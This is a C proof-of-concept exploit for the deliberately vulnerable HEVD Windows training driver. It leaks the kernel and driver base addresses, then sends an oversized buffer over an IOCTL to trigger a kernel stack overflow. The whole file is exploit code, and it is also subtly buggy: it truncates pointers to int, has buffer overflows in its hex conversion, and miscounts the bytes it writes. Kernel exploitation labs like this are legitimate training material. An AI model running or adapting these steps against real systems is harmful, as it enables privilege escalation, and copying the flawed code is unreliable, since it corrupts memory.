#include <Windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <stdio.h>

//ioctl code to trigger Stack Overflow vulnerability
#define IOCTL_CODE 0x222003

// Get base of ntoskrnl.exe
LPVOID *GetNTOsBase()
{
    LPVOID Bases[0x1000];
    DWORD needed = 0;
    LPVOID *baseAddresses = malloc(16);
    if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed))
    {
        //ntoskrnl base address
        baseAddresses[0] = Bases[0];

        /*
        //Enumerate all driver base address until HEVD driver base
        for (int i=0;i<sizeof(Bases);i++) {
            printf("Driver %d: %p\n", i, Bases[i]);
        }*/

        //HEVD base address
        baseAddresses[1] = Bases[97];
    }
    return baseAddresses;
}

int writeToFile(char *fileData)
{
    FILE *filePtr;
    size_t countWritten;

    filePtr = fopen("C:\\Users\\hevd\\Desktop\\TestHevdBaseAddress.dat", "wb");
    if (!filePtr)
    {
        printf("Failed to create file handle :(\n");
        return 0;
    }
    countWritten = fwrite(fileData, sizeof(fileData), 1, filePtr);
    fclose(filePtr);
    if (!countWritten)
    {
        printf("Failed to write data :(\n");
        return 0;
    }

    return 1;
}

char *lpvoidToStr(LPVOID inputPtr)
{
    int intPtr = (int)inputPtr;
    char hexByteStr[2];
    int hexByte;

    char *ptrStr = malloc(4);
    char ptrHexStr[8];
    sprintf(ptrHexStr, "%0x", intPtr);

    //printf("ptrHexStr: %s\n", ptrHexStr);
    //printf("intPtr: 0x%x\n", intPtr);

    int j = 0;
    for (int i = 0; i < strlen(ptrHexStr); i += 2)
    {
        strncpy(hexByteStr, ptrHexStr + i, 2);
        //printf("Hexbyte string (%d): %s\n", j, hexByteStr);
        hexByte = strtol(hexByteStr, NULL, 16);
        //printf("Hexbyte (%d): %d\n", j, hexByte);
        ptrStr[j] = (char)hexByte;
        j++;
    }

    return ptrStr;
}

int main()
{
    //Create Handle to HEVD Driver
    HANDLE drivObjHndl = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    //Check if handle is valid
    if (drivObjHndl == INVALID_HANDLE_VALUE)
    {
        printf("No handle to driver :(\n");
        exit(-1);
    }

    LPVOID *baseAddresses = GetNTOsBase();
    if (!baseAddresses[0] && !baseAddresses[1])
    {
        printf("Failed to get base addresses :(\n");
    }
    LPVOID ntoskrnlBase = baseAddresses[0];
    LPVOID hevdBase = baseAddresses[1];

    char *hevdBaseStr = lpvoidToStr(hevdBase);

    printf("[*] Kernel base address: 0x%p\n", ntoskrnlBase);
    printf("[*] HEVD driver base address: 0x%p\n", hevdBase);

    int fileWritten = writeToFile(hevdBaseStr);
    if (!fileWritten)
    {
        printf("Failed to write file :(\n");
    }
    //Hexdump command (Powershell): Format-Hex .\TestHevdBaseAddress.dat
    printf("[*] Wrote HEVD driver string to file: %s\n", hevdBaseStr);

    //variable for DeviceIoControl->lpBytesReturned parameter
    DWORD bytesRtrnd;

    printf("[*] Setting up test payload!\n");

    //Overflow Buffer in HEVD
    char payload[69];

    //Fill with 'A'
    memset(payload, 'A', sizeof(payload));

    //Send exploit to driver
    DeviceIoControl(drivObjHndl, IOCTL_CODE, payload, sizeof(payload), NULL, 0, &bytesRtrnd, NULL);

    //Free used heap allocations
    free(baseAddresses);
    free(hevdBaseStr);

    //Close handle to HEVD driver
    CloseHandle(drivObjHndl);
}
